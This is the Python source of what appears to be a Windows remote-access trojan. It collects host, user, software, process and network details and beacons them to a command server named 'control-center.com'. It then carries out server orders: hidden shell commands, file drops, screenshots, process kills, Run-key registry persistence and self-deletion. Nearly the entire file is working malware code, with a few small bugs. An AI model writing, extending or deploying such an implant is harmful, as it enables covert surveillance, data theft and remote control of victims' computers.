# -*- coding: utf-8 -*-
"""
Created on Mon Jul  8 16:07:22 2019

@author: user
"""

import os

import subprocess
import sys

import requests

import platform

import socket
import psutil
import netifaces

import datetime
import tzlocal
from uptime import boottime
import time

import json
import re

import wmi

import base64

import subprocess

import random

import win32gui
import win32ui
import win32con
import win32api

from io import BytesIO

from io import StringIO

import winreg

import tempfile

import certifi


class Network():
    def __init__(self):
        self.ip_adress = None
        self.netmask = None
        self.mac_adress = None
        self.gateway = None

class Software():
    def __init__(self):
        self.name = None
        self.vendor = None
        self.install_date = None
        self.version = None

class Task():
    def __init__(self):
        self.id = None
        self.name = None
        self.owner = None
        self.run_as_admin = False
            
class User():
    def __init__(self):
        self.username = None
        self.local_account = None
        self.domain = None
        self.disable = None

class Volumes():
    def __init__(self):
        self.name = None
        self.description = None
        self.file_system = None
        self.capacity = None
        self.free_space = None
        self.volume_serial_number = None

class MachineInfo():
    def __init__(self):

        self.OS = None
        self.version = None
        self.language = None
        self.version = None
        self.hostname = None
        self.current_username = None
        self.UUID = None

        self.domain = None
        self.workgroup = None

        self.current_time = None
        self.timezone = None
        self.boot_time = None

        self.software_list = []
        self.network_info = []
        self.users_list = []
        self.task_list = []
        self.time_data = [] 
        self.mounted_voluems = []

    def get_basic_info(self, w):

        for o in w.Win32_OperatingSystem():
            self.OS = o.Name.split('|')[0]
            self.language = o.OSLanguage
            self.version = o.Version

        for product in w.Win32_ComputerSystemProduct():
            self.UUID = product.UUID

        self.hostname = socket.gethostname()
        self.current_username = os.getlogin()

        self.current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.timezone = tzlocal.get_localzone().zone
        self.boot_time = boottime().strftime("%Y-%m-%d %H:%M:%S")

    def get_network_info(self, w):

        networks = psutil.net_if_addrs()

        systeminfo = w.Win32_ComputerSystem()[0]
        self.workgroup = systeminfo.Workgroup
        domain = os.environ['userdomain']
        if self.hostname != domain:
            self.domain = os.environ['userdomain']

        for interfaces in networks:
            if len(networks[interfaces]) != 3:
                continue
            interface = Network()
            self.network_info.append(interface)
            interface.mac_adress = networks[interfaces][0].address
            interface.ip_adress = networks[interfaces][1].address
            interface.netmask = networks[interfaces][1].netmask
            try:
                interface.gateway = netifaces.gateways()[2][0][0]
            except KeyError:
                pass

    def write_tsklist(self, w):
        
        for process in w.Win32_Process():
            task = Task()
            task.id = process.ProcessId
            task.name = process.Name
            try:
                process_owner = process.GetOwner()
            except:
                pass
            if process_owner[2] == None:
                task.owner = 'SYSTEM'
            else:
                task.owner = process_owner[2]
            self.task_list.append(task)          

    def search_software(self, w):

        for product in w.Win32_Product():
            software = Software()
            software.name = product.Name
            software.vendor = product.Vendor
            software.version = product.Version
            date = product.InstallDate
            year = date[:4]
            month = date[4:][:2]
            day = date[:2]
            software.install_date = month + "/" + day + "/" + year
            software.version = product.Version
            self.software_list.append(software)

    def write_userlist(self, w):

        for u in w.Win32_UserAccount():
            user = User()
            user.username = u.Name
            user.description = u.Description
            user.local_account = u.LocalAccount
            user.disable = u.Disabled
            user.domain = u.Domain
            self.users_list.append(user)

    def look_volumes(self, w):

        for v in w.Win32_LogicalDisk():
            volume = Volumes()
            volume.name = v.Name
            volume.file_system = v.FileSystem
            volume.description = v.Description
            try:
                volume.free_space = '%.2f'%(int(v.FreeSpace)/(1024*1024*1024))
                volume.capacity = '%.2f'%(int(v.Size)/(1024*1024*1024))
            except:
                pass
            volume.volume_serial_number = v.VolumeSerialNumber
            self.mounted_voluems.append(volume)
        
    def inspect_machine(self):

        wmi_obj = wmi.WMI()

        self.get_basic_info(wmi_obj)

        self.search_software(wmi_obj)

        self.get_network_info(wmi_obj)

        self.write_userlist(wmi_obj)

        self.write_tsklist(wmi_obj)

        self.look_volumes(wmi_obj)

class Job():
    def __init__(self, instruction = {"cmd_id": 1, "cmd": None,
         "cmd_type": 'init', "time_limit": 0, "data": None, "flag_wait_result": True}):
        self.cmd_id = instruction['cmd_id']
        self.cmd = instruction['cmd']
        self.cmd_type = instruction['cmd_type']
        self.time_limit = instruction['time_limit']
        self.time_result = None
        self.data = instruction['data']
        self.status = None
        self.flag_wait_result = instruction['flag_wait_result']

    def collecting_system_information(self):
        current_state = MachineInfo()
        current_state.inspect_machine()
        self.data = json.dumps(current_state, default=lambda o: o.__dict__)
        
    def stop_process(self):
        c = wmi.WMI()
        for process in c.Win32_Process():
            if process.ProcessId == int(self.cmd):
                process.Terminate()

    def make_screenshot(self):
        
        hdesktop = win32gui.GetDesktopWindow()
        
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        
        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        
        mem_dc = img_dc.CreateCompatibleDC()
        
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top),win32con.SRCCOPY)
        
        screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')
        
        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())
        screen_file = open('c:\\WINDOWS\\Temp\\screenshot.bmp', 'rb')
        screen = screen_file.read()
        self.data = base64.b64encode(screen).decode('utf-8')
        screen_file.close()
        os.remove('c:\\WINDOWS\\Temp\\screenshot.bmp')

    def run_cmd(self):

        if self.flag_wait_result == True:
            try: 
                si = subprocess.STARTUPINFO() 
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW 
                h = subprocess.check_output(self.cmd, stdin=subprocess.PIPE, 
                stderr=subprocess.PIPE, startupinfo=si) 
                self.data = base64.b64encode(h).decode('utf-8')
            except OSError as e: 
                self.data = e
                self.status = 'failed' 
        else:
            subprocess.Popen(self.cmd, shell=True, creationflags=subprocess.SW_HIDE)

    def save_file_from_server(self):
        encoded_string = self.data.encode('utf-8')
        decoded_string = base64.b64decode(encoded_string)
        with open (self.cmd, 'wb') as new_file:
            new_file.write(decoded_string)
        self.data = None

    def resource_path(self, relative_path):
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        return os.path.join(base_path, relative_path)

    def upload_result_and_get_instructions (self):
        global config
        send_json = json.dumps(self, default=lambda o: o.__dict__)
        sleep_time = random.uniform(1.1, 1.9)

        file_path = resource_path('cert/pubkey2.pem')

        while (sleep_time < config['max_communication_interval']):
            try:
                response = requests.post(url = 'https://'+ config['server_adress'] + ':443' +'/upload/' + 
                str(config['machine_id']) + '/' + str(self.cmd_id), json = send_json, verify = file_path)
            except:
                time.sleep(sleep_time)
                sleep_time = sleep_time**random.uniform(1.1, 2.5)
            else:
                message = json.loads(response.text)
                return message
            return 'Server is dead'

    def update_config(self):
        global config
        config = self.data

    def uninstall(self, my_path, REG_PATH, registry_value):

        subprocess.Popen('timeout /T 5 && DEL '+ my_path, shell=True, creationflags=subprocess.SW_HIDE)
        try:
            open_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(open_key, registry_value)
            open_key.Close()
        except:
            pass
        sys.exit()
    
    def install_in_OS(self, my_path, REG_PATH, registry_value):
        
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, registry_value, 0, winreg.REG_SZ, my_path)
        winreg.CloseKey(registry_key)

    def check_contact_time(self):
        current_time = datetime.datetime.now()
        time_for_contact = current_time + datetime.timedelta(seconds = self.time_limit)
        if time_for_contact > current_time:
            time.sleep((time_for_contact - current_time).total_seconds())

    def do_job(self):
        global config
        REG_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        my_path = sys.executable

        self.check_contact_time()
        self.status = 'success'
        try:
            if self.cmd_type == 'collect info':
                self.collecting_system_information()
            elif self.cmd_type == 'save file':
                self.save_file_from_server()
            elif self.cmd_type == 'shell':
                self.run_cmd()
            elif self.cmd_type == 'stop process':
                self.stop_process()
            elif self.cmd_type == 'screen':
                self.make_screenshot()
            elif self.cmd_type == 'uninstall':
                self.uninstall(my_path, REG_PATH, config['registry_value'])
            elif self.cmd_type == 'install':
                self.install_in_OS(my_path, REG_PATH, config['registry_value'])
            elif self.cmd_type == 'update config':
                self.update_config()
        except:
            self.status = 'failed'
        self.time_result = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")
        responce_from_server = self.upload_result_and_get_instructions()
        return responce_from_server
        
def main():

    first_job = Job()

    first_job.status = 'success'
    try:
        first_job.collecting_system_information()
    except:
        first_job.status = 'failed'

    first_job.time_result = datetime.datetime.now().strftime("%Y-%m-%d %H-%M-%S")

    next_instructions = first_job.upload_result_and_get_instructions()

    while next_instructions != 'Server is dead':
        next_job = Job(next_instructions)
        next_instructions = next_job.do_job()

config = dict(
    machine_id = 355,
    server_adress = 'control-center.com',  # ! control-center.com
    registry_value = 'Pdmin',
    max_communication_interval = 60000 # ms
    )

if __name__ == "__main__":
    main()